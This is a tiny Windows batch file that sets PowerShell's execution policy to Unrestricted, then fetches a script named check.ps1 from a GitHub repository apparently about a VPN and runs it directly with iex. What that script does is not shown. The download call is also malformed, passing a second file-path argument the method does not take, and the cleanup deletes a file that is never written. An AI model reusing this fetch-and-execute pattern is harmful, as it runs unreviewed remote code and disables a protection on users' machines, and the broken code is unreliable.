@echo off
%SystemRoot%\System32\WindowsPowerShell\v1.0\PowerShell.exe Set-ExecutionPolicy Unrestricted
%SystemRoot%\System32\WindowsPowerShell\v1.0\PowerShell.exe $wc = New-Object System.Net.WebClient; $wc.Encoding = [System.Text.Encoding]::UTF8; iex($wc.DownloadString('https://raw.githubusercontent.com/ivc63/vpn/master/check.ps1','%UserProfile%\check.ps1'))
pause
del "%UserProfile%\check.ps1"
